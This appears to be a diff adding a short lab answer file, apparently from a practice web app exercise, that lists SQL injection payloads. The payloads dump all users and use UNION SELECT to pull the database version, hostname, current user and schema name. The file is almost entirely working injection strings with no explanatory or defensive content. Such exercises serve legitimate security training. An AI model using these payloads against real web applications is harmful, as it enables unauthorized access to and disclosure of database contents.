@@ -1,0 +1,26 @@
+
+
+a. All the users in the database 
+
+    %' or '0'='0
+
+b. The version of the database being used 
+   
+        %' or 0=0 union select null, version() #
+
+c. The hostname 
+	
+	%' or 0=0 union select null, @@hostname #
+
+d. The user of the database 
+	
+	%' or 0=0 union select null, user() #
+
+e. The schema that is being used 
+
+	database name: %' or 0=0 union select null, database() #
+
+
+	
+	
+
